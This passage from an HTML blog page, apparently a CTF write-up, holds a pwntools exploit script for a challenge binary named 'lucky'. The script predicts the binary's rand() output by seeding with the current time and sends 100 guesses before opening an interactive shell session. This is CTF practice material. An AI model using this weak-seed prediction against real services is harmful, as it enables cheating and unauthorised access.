class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from ctypes import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;.&#x2F;lucky&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line"># libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">flag&#x3D;0</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;&#39;, )</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sla(&#39;lucky guy&#39;,&#39;wendy&#39;)</span><br><span class="line">libc.srand((libc.time(0) &#x2F; 0xA)+1)</span><br><span class="line"></span><br><span class="line"># sla(&#39;number:&#39;, str(libc.rand()))</span><br><span class="line">for i in range(100):</span><br><span class="line">    sla(&#39;number:&#39;,str(libc.rand()))</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



                </div>
                
<nav id="article-nav">
  
    <a href="/2021/04/21/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-title">
        
          Hello >
        
      </div>
    </a>
  
  
    <a href="/2021/03/03/first-blog/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title"> < first-blog</div>
    </a>
  
</nav>


            </div>
        </div>
        
            <div id="disqus_thread"></div>
<script>
    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//yzzting.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a></noscript>
<script id="dsq-count-scr" src="//yzzting.disqus.com/count.js" async></script>

        
        
</article>



		</div>
		<div id="heart"></div>

    <footer class="blog-footer" id="blog-footer">
        <div id="footer-info" class="inner">
            Made with â™¥ by <a href="https://github.com/yzzting/hexo-theme-MyFairLady" target="_blank">MyFairLady</a>
        </div>
    </footer>
    <script src="/js/sidebar.js"></script>
    <script src="/js/toTop.js"></script>
    <script src="/js/bookmark.js"></script>
	</body>
	</html>
